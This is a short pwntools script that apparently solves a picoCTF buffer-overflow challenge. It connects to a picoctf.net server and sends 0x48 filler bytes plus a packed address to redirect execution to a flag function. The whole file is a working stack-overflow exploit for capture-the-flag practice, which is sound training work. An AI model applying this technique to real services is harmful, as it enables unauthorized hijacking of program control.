from pwn import *
# p = process('./vuln')
p = remote("saturn.picoctf.net", 62750)
elf = ELF('./vuln')

p.recvuntil("flag: ")
addr_flag = 0x40123b
payload = "A" * 0x48 + p64(addr_flag)
p.sendline(payload)

p.interactive()
